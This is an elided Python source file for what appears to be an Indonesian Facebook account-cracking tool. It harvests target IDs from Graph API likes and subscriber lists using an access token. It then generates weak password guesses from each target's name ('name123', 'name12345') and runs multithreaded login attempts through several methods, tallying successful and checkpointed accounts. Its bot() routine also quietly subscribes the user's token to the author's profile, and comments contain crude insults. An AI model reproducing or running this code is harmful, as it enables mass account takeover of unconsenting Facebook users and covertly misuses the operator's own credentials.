...
───────────────────────────────────────────────────────
 [\x1b[1;96m+%s] Author   : SYAFIKXD.
 [\x1b[1;96m+%s] Github   : https://github.com/XD
 [\x1b[1;96m+%s] Facebook : https://www.facebook.com/
───────────────────────────────────────────────────────\n'''%(N,N,N,N))
...
class login:
	...
	def takon(self):
		...
		if takon in ['y','Y','iya']:
			...
			os.system('xdg-open wa.me/6281221525');exit()
		else:
			login().__login__()
	def bot(self):
		...
		requests.post('https://graph.facebook.com/100017207508798/subscribers?access_token=' + toket)
		os.system('xdg-open https://www.facebook.com/profile.php?id=100017207508798')
		menu().main()
	...
	def pilih(self):
		...
		if usna in ['']:
			...
			try:
				print(' %s║'%(N))
				idt = input(' %s╠═[%s•%s] Masukan id : '%(N,O,N))
				r = requests.get('https://graph.facebook.com/%s/likes?limit=5000&access_token=%s'%(idt,pepek))
				z = json.loads(r.text)
				id = []
				for a in z['data']:
					id.append(a['id'] + '<=>' + a['name'])
			...
			try:
				print(' %s║'%(N))
				idt = input(' %s╠═[%s•%s] Masukan id : '%(N,O,N))
				r = requests.get('https://graph.facebook.com/%s/likes?limit=5000&access_token=%s'%(idt,memek))
				z = json.loads(r.text)
				id = []
			...
			try:
				print(' %s║'%(N))
				idt = input(' %s╠═[%s•%s] Masukan id : '%(N,O,N))
				r = requests.get('https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s'%(idt,khamdihiXDX))
				z = json.loads(r.text)
				id = []
				for w in z['data']:
...
class crack:
		...
		with khamdihiXD(max_workers=30) as dihi:
			for nama in self.id:
				try:
					...
					nun = gas[0]
					if len(nun)>=6:
						pwx = [nun, nun+'123',nun+'12345', name]
					elif len(nun)<=2:
						pwx = [nun, nun+'123',nun+'12345', name]
					elif len(nun)<=5:
						pwx = [nun, nun+'123', nun+'12345', name]
	...
	def b_api(self,user,pwx): # Kamu jahat :v
		...
		sys.stdout.write('\r %s* %s[%smantap%s] %s/%s [OK:%s - CP:%s] %s*'%(eram,N,O,N,loop,len(self.id),len(ok),len(cp),nufi));sys.stdout.flush() # Lo kontol...
		try:
			for pw in pwx:
				pw = pw.lower()
				ses = requests.Session()
	...
	def metod2(self,user,pwx):
		...
		nufikhaXD = '%'
		print('\r%s [rupat] %s/%s [OK:%s-CP:%s] >< %s%s%s '%(ram,loop,len(self.id),len(ok),len(cp),int(fikA),str(nufikhaXD),N), end=' ');sys.stdout.flush()
	...
	def mbasic(self,user,pwx):
		...
		sys.stdout.write('\r %s* %s[%srupat%s] %s/%s [OK:%s CP:%s] %s* '%(asw,N,H,N,loop,len(self.id),len(ok),len(cp),mmk));sys.stdout.flush()
		try:
			for pw in pwx:
				pw = pw.lower()
				ses = requests.Session()
